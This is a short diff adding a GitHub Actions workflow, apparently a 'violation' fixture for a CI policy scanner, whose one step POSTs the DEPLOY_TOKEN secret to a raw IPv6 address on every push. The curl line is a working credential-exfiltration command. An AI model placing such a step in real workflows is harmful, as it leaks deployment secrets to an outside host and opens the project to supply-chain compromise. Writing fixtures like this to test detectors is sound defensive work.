@@ -1,0 +1,7 @@
+name: violation_ipv6_literal
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s -X POST -d 'k=${{ secrets.DEPLOY_TOKEN }}' http://[2606:4700:4700::1111]/
